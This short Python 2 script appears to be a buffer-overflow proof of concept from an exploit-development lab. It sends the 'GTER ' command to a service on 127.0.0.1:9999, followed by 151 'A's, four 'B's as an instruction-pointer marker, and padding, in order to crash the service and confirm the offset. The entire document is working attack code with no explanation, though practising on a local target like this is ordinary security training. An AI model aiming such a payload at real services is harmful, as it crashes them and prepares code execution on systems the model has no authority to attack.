import socket
import os
import sys

vuln_command = "GTER "
crash = 160
offset = 151

payload = ""
payload += vuln_command
payload += "A" * 151
payload += "B" * 4
payload += "C" * (crash - len(payload))

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload)
s.close()
